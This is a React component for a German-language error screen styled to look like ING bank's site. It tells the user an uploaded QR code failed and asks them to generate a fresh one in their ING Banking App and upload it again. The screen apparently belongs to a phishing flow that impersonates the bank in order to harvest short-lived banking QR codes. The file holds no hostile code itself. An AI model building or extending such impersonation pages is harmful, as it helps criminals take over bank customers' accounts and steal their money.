import React from 'react';
import { AlertCircle, RefreshCw } from 'lucide-react';

interface QRErrorScreenProps {
  onTransition: () => void;
}

const QRErrorScreen: React.FC<QRErrorScreenProps> = ({ onTransition }) => {
  return (
    <div className="ing-card">
      <div style={{ textAlign: 'center', padding: '20px 0' }}>
        <AlertCircle size={64} color="#e30613" style={{ marginBottom: '24px' }} />
        
        <h2 style={{
          color: '#e30613',
          fontSize: '1.5rem',
          fontWeight: '600',
          marginBottom: '16px',
          fontFamily: 'ING Me, Arial, sans-serif'
        }}>
          QR-Code konnte nicht gelesen werden
        </h2>
        
        <p style={{
          color: '#666',
          fontSize: '16px',
          lineHeight: '1.6',
          marginBottom: '24px',
          fontFamily: 'ING Me, Arial, sans-serif'
        }}>
          Der hochgeladene QR-Code konnte nicht erfolgreich analysiert werden. 
          Dies kann verschiedene Gründe haben:
        </p>
        
        <div style={{
          backgroundColor: '#f8f9fa',
          borderRadius: '8px',
          padding: '20px',
          marginBottom: '24px',
          textAlign: 'left'
        }}>
          <ul style={{
            color: '#666',
            fontSize: '14px',
            lineHeight: '1.5',
            fontFamily: 'ING Me, Arial, sans-serif',
            paddingLeft: '20px',
            margin: 0
          }}>
            <li style={{ marginBottom: '8px' }}>QR-Code ist abgelaufen (älter als 5 Minuten)</li>
            <li style={{ marginBottom: '8px' }}>Bild ist unscharf oder schlecht beleuchtet</li>
            <li style={{ marginBottom: '8px' }}>QR-Code ist beschädigt oder unvollständig</li>
            <li>Falscher QR-Code-Typ verwendet</li>
          </ul>
        </div>
        
        <div style={{
          backgroundColor: '#fff3cd',
          border: '1px solid #ffeaa7',
          borderRadius: '8px',
          padding: '16px',
          marginBottom: '24px'
        }}>
          <p style={{
            color: '#856404',
            fontSize: '14px',
            margin: 0,
            fontFamily: 'ING Me, Arial, sans-serif',
            lineHeight: '1.5'
          }}>
            <strong>Tipp:</strong> Generieren Sie einen neuen QR-Code in Ihrer ING Banking App und stellen Sie sicher, dass das Bild scharf und gut beleuchtet ist.
          </p>
        </div>
        
        <button
          onClick={onTransition}
          style={{
            backgroundColor: '#ff6200',
            color: 'white',
            border: 'none',
            borderRadius: '8px',
            padding: '16px 32px',
            fontSize: '16px',
            fontWeight: '600',
            cursor: 'pointer',
            fontFamily: 'ING Me, Arial, sans-serif',
            transition: 'all 0.3s ease',
            display: 'inline-flex',
            alignItems: 'center',
            gap: '8px',
            boxShadow: '2px 2px 4px rgba(0, 0, 0, 0.15)'
          }}
          onMouseEnter={(e) => {
            e.currentTarget.style.backgroundColor = '#e55800';
            e.currentTarget.style.transform = 'translateY(-1px)';
            e.currentTarget.style.boxShadow = '3px 3px 6px rgba(0, 0, 0, 0.2)';
          }}
          onMouseLeave={(e) => {
            e.currentTarget.style.backgroundColor = '#ff6200';
            e.currentTarget.style.transform = 'translateY(0)';
            e.currentTarget.style.boxShadow = '2px 2px 4px rgba(0, 0, 0, 0.15)';
          }}
        >
          <RefreshCw size={16} />
          Neuen QR-Code hochladen
        </button>
      </div>
    </div>
  );
};

export default QRErrorScreen;
